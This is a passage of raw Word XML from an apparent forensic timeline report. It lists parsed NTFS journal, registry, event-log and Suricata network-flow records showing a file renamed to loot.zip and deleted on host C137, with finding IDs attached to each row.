            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.zip</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-026, F-031, I-014, T-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-026, F-031, I-008, I-014, T-013, T-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened (RecentDocs)</w:t>
              <w:br/>
              <w:t>loot.zip</w:t>
              <w:br/>
              <w:t>lnk=loot.lnk mru=0 .zip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_RecentDocs.csv#14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>ObjectIdChange [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36778</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-031, T-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\loot.lnk</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36780</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-031, T-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-026, F-030, F-031, T-013, T-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>Thoughts.txt (Notepad) C:\Users\mortysmith\Desktop\Thoughts.txt (file:Unmapped GUID: //C:/Users/mortysmith/Desktop/Thoughs.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD676585-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:39.785228</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M) ; $SI access (A) ; $SI MFT change (C)</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Thoughts.lnk</w:t>
              <w:br/>
              <w:t>size=979</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#114154</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:48.926185</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (BAM)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\notepad.exe</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_BamDam.csv#42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.468385</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4647 | Microsoft-Windows-Security-Auditing | User initiated logoff | LogonId: 0x857E73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39812</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-023, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.567580</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: key written ; Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\Administrator</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.986302</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4634 | Microsoft-Windows-Security-Auditing | An account was logged off | Target: C137\Administrator | LogonType 3 | LogonId: 0x842184</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39819</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:16.583483</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.10</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50957 -&gt; 10.42.85.10:445 smb state=established bytes=15650/12757</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#27563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:16.637781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>smb TCP 10.42.85.115:50957 -&gt; 10.42.85.10:445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_smb.jsonl#241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.483780</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>203.78.103.109</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50972 -&gt; 203.78.103.109:443 failed state=established bytes=39409/488552</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
